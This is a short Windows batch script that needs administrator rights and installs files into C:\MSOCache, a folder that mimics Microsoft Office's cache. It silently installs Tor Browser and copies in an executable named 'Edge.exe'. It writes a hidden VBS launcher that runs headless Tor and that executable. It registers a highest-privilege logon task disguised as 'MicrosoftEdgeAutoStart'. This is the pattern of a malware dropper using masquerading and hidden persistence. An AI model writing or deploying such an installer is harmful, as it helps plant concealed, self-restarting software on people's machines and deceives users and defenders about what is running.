@echo off
setlocal enabledelayedexpansion

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Run as Administrator!
    pause
    exit /b 1
)

set "SRC=%~dp0"
set "DST=C:\MSOCache"
set "TOR_INSTALLER=%SRC%tor.exe"
set "TOR_PATH=%DST%\TorBrowser"

mkdir "%DST%" 2>nul

copy /Y "%SRC%config.json" "%DST%\" >nul
copy /Y "%SRC%Edge.exe" "%DST%\" >nul

if exist "%TOR_INSTALLER%" (
    "%TOR_INSTALLER%" /S /D=%TOR_PATH%
    timeout /t 20 /nobreak >nul
)

(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run "cmd /c cd /d C:\MSOCache\TorBrowser\Browser ^&^& start /B firefox.exe -headless", 0
echo WScript.Sleep 8000
echo WshShell.Run "cmd /c cd /d C:\MSOCache ^&^& start /B Edge.exe", 0
echo Set WshShell = Nothing
) > "%DST%\launcher.vbs"

schtasks /Delete /TN "MicrosoftEdgeAutoStart" /F >nul 2>&1

schtasks /Create /SC ONLOGON /TN "MicrosoftEdgeAutoStart" /TR "wscript.exe \"%DST%\launcher.vbs\"" /RL HIGHEST /F >nul

echo Done. Installed to %DST%
echo Starting now...
wscript.exe "%DST%\launcher.vbs"

timeout /t 2 /nobreak >nul
exit /b 0
